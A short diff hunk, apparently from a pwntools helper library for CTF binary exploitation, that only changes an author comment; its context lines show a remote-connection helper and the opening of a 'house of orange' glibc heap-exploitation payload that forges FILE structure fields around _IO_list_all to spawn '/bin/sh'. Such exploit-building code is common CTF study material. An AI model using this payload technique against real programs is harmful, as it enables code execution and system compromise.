@@ -117,7 +117,7 @@ def init_pwn(BIN_FILE = '',LIBC_FILE='',remote_detail=('127.0.0.1',23333),is_env
 
     return io,elf,libc
 
-# code by w1ther
+# coded by w1tcher
 def house_of_orange(head_addr, system_addr, io_list_all):
     payload = b'/bin/sh\x00'
     payload = payload + p64(97) + p64(0) + p64(io_list_all - 16)
